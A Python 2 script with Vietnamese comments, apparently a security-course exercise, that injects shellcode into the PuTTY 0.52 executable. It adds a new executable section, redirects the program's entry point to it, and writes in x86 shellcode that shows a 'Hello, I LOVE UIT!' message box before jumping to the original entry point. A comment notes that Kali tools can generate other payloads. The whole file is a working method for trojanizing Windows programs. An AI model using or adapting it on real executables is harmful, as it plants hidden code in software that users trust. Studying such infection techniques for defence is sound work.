import pefile
import mmap
import os

#hàm tính align cho địa chỉ
def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment

#đọc file exe muốn tấn công
exe_path = "putty-0.52.exe"

#đoạn shellcode muốn thực hiện
#Shellcode này có thêt sử dụng tools của Kali để thực hiện
shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                  b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                  b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                  b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                  b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                  b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                  b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                  b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                  b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                  b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                  b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                  b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                  b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                  b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                  b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                  b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
                  b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
                  b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x54\x21\x58"
                  b"\x20\x68\x45\x20\x55\x49\x68\x20\x4c\x4f\x56\x68\x6f"
                  b"\x2c\x20\x49\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
                  b"\x12\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0\xB8"
                  b"\x0C\x3E\x43\x00\xFF\xD0")


# STEP 0x01 - Resize the Executable
# Note: I added some more space to avoid error

#Bước 1: Mở rộng kích thước của file ------------------------------------------------------------------
#Mô tả: vì theo hướng sẽ chèn thêm section nên kích thước file sẽ tăng lên, cần chỉnh sửa lại thông tin kích thước file 
print "[*] STEP 1 - Resize the Executable"

original_size = os.path.getsize(exe_path)
print "\t[+] Original Size = %d" % original_size
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

print "\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path)

# Bước 2: Thêm section mới vào file thực thi -----------------------------------------------------------
print "[*] STEP 2 - Add the New Section Header"

#đọc file PE
pe = pefile.PE(exe_path)

#Lấy thông tin số lượng section
number_of_section = pe.FILE_HEADER.NumberOfSections

#lấy index của section cuối cùng, thư viện lấy ra sẽ đánh số thứ tự từ 0
last_section = number_of_section - 1

#lấy Alignment
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment


new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

# Tính toán các thông tin trong section header của section mới
raw_size = align(0x1000, file_alignment)
virtual_size = align(0x1000, section_alignment)
raw_offset = align((pe.sections[last_section].PointerToRawData + pe.sections[last_section].SizeOfRawData), file_alignment)
virtual_offset = align((pe.sections[last_section].VirtualAddress + pe.sections[last_section].Misc_VirtualSize), section_alignment)

# CODE | EXECUTE | READ | WRITE
characteristics = 0xE0000020
# Section name phải bằng 4 bytes
name = ".axc" + (4 * '\x00')

# Thiết lập tên
pe.set_bytes_at_offset(new_section_offset, name)
print "\t[+] Section Name = %s" % name
# Thiết lập địa chỉ section trên RAM
pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
print "\t[+] Virtual Size = %s" % hex(virtual_size)
# Thiết lập địa chỉ bắt đầu section trên RAM
pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
print "\t[+] Virtual Offset = %s" % hex(virtual_offset)
# Thiết lập địa chỉ section trên đĩa
pe.set_dword_at_offset(new_section_offset + 16, raw_size)
print "\t[+] Raw Size = %s" % hex(raw_size)
# # Thiết lập địa chỉ section trên đĩa
pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
print "\t[+] Raw Offset = %s" % hex(raw_offset)
# Thiết lập phần trống còn lại là 0
pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
# Thiết lập các characteristics
pe.set_dword_at_offset(new_section_offset + 36, characteristics)
print "\t[+] Characteristics = %s\n" % hex(characteristics)

# Bước 3 - Chỉnh sửa các thông tin trong HEADER chính của file ---------------------------------------------
print "[*] STEP 3 - Modify the Main Headers"

# Tăng số lượng Section lên thêm 1
pe.FILE_HEADER.NumberOfSections += 1
print "\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections

# Tính tổng kích thước file chính là địa chỉ cuối cùng của section mới
pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
print "\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage

#viết vào file PE
pe.write(exe_path)

#Load file PE để chỉnh sửa địa chỉ pointer  
pe = pefile.PE(exe_path)
number_of_section = pe.FILE_HEADER.NumberOfSections
last_section = number_of_section - 1

#Entrypoint địa chỉ khi chương trình bắt đầu thực thi
new_ep = pe.sections[last_section].VirtualAddress
print "\t[+] New Entry Point = %s" % hex(
    pe.sections[last_section].VirtualAddress)

#lưu lại địa chỉ Entrypoint ban đầu để thực thi return
oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
print "\t[+] Original Entry Point = %s\n" % hex(
    pe.OPTIONAL_HEADER.AddressOfEntryPoint)
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

# Bước 4: chèn đoạn shellcode vào trong section mới -------------------------------------------------------
print "[*] STEP 4 - Inject the Shellcode in the New Section"

#gán địa chỉ bắt đầu là địa chỉ bắt đầu của Section mới
raw_offset = pe.sections[last_section].PointerToRawData

#Ghi đoạn shell code vào Section mới
pe.set_bytes_at_offset(raw_offset, shellcode)
print "\t[+] Shellcode wrote in the new section"

pe.write(exe_path)